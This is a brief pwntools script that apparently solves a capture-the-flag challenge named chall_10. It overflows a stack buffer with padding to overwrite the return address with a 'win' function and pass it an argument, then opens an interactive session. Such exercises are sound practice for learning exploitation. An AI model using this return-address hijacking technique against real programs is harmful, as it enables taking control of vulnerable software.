from pwn import *
p=process("./chall_10")
binary=binary.context=ELF("./chall_10")
payload = b"A"*(0x308 + 4) +p32(binary.sym.win) +b"blah"+ p32(0x1a55fac3)
p.sendline(payload)
p.interactive()
